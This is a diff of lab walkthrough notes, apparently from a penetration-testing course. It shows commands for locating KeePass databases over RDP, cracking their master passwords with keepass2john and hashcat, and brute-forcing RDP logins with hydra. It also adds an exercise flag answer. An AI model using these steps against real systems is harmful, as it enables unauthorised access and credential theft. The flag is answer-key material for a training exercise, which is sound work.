@@ -75,46 +75,55 @@ Password list after successful entering the Master Password
 
 Lab 1 - Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password".
 >``` shell
->xfreerdp3 /u:jason /p:lab /v:192.168.241.203 /cert:ignore
+># 1) RDP into SALESWK01 as user jason using the provided credentials (initial access)
+>kali@kali:~$ xfreerdp3 /u:jason /p:lab /v:192.168.241.203 /cert:ignore
 >
-># Open powershell
+># 2) (On Windows) Open PowerShell to enumerate installed applications
 >
+># 3) Enumerate installed programs to confirm KeePass is installed on the system
 >Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
->> Select DisplayName
+>Select DisplayName
 >
+># 4) Search the entire C:\ drive for KeePass database files (*.kdbx)
 >Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 >
->(Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdb
+># 5) (Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdbx
 >
->keepass2john Database.kdbx > keepass.hash
+># 6) Convert the KeePass database into a crackable hash format using keepass2john
+>kali@kali:~$ keepass2john Database.kdbx > keepass.hash
 >
->sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
+># 7) Clean the hash so it starts at "$keepass$" (remove database name prefix)
+>kali@kali:~$ sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
 >
->cat keepass.hash
+># 8) Verify the cleaned KeePass hash format before cracking
+>kali@kali:~$ cat keepass.hash
 >
->hashcat --help | grep -i keepass
+># 9) Identify the correct Hashcat mode for KeePass databases
+>kali@kali:~$ hashcat --help | grep -i keepass
 >
->hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
+># 10) Crack the KeePass master password using rockyou.txt and mutation rules
+>kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
 >-r /usr/share/hashcat/rules/rockyou-30000.rule
 >
->hashcat -m 13400 keepass.hash --show
+># 11) Display the cracked KeePass master password from hashcat’s potfile
+>kali@kali:~$ hashcat -m 13400 keepass.hash --show
 >
-># (On Windows) Open KeePass and unlock Database.kdbx using the cracked master password (example: pinkpanther1234)
+># 12) (On Windows) Open KeePass and unlock Database.kdbx using the cracked master password
 >
->#In KeePass, locate the entry with Title "flag" and copy the PASSWORD field: This value is the answer to the exercise (note: not formatted as OS{}).
+># 13) In KeePass, locate the entry with Title "flag" and copy the PASSWORD field: This value is the answer to the exercise (note: not formatted as OS{}).
 >```
->
+>XOWV2yg3JVkYc5cOBYip
 
 Lab 2 - Enumerate VM #2 and get access to the system as user nadine. Obtain the password stored as title "flag" in the password manager and enter it as answer to this exercise. Note that the flag is not formatted as OS{} for this exercise.
 >``` shell
 ># 1) Confirm RDP is running on the target (service/version enumeration on port 3389)
->nmap -p 3389 -sV 192.168.241.227
+>kali@kali:~$ nmap -p 3389 -sV 192.168.241.227
 >
 ># 2) Brute-force RDP credentials for user "nadine" using rockyou.txt (dictionary attack for GUI access)
->hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
+>kali@kali:~$ hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
 >
 ># 3) RDP into VM #2 as nadine using the cracked password from Hydra (example: 123abc)
->xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
+>kali@kali:~$ xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
 >
 ># 4) (On Windows) Run PowerShell "As Administrator" so you can enumerate installed programs and search the full disk
 >
@@ -128,19 +137,19 @@ Lab 2 - Enumerate VM #2 and get access to the system as user nadine. Obtain the 
 ># 7) (Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdbx
 >
 ># 8) Convert the KeePass database into a crackable hash format (keepass2john output)
->keepass2john Database.kdbx > keepass.hash
+>kali@kali:~$ keepass2john Database.kdbx > keepass.hash
 >
 ># 9) Clean the hash so it starts at "$keepass$" (remove the "Database:" prefix and any leading text)
->sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
+>kali@kali:~$ sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
 >
 ># 10) Verify the cleaned hash format looks correct before cracking
->cat keepass.hash
+>kali@kali:~$ cat keepass.hash
 >
 ># 11) Confirm the correct Hashcat mode for KeePass (should show mode 13400 for KeePass 1/2)
->hashcat --help | grep -i keepass
+>kali@kali:~$ hashcat --help | grep -i keepass
 >
 ># 12) Crack the KeePass master password offline using rockyou + rockyou-30000 rules
->hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
+>kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
 >-r /usr/share/hashcat/rules/rockyou-30000.rule
 >
 ># 13) (On Windows) Open KeePass and unlock Database.kdbx using the cracked master password (example: pinkpanther1234)
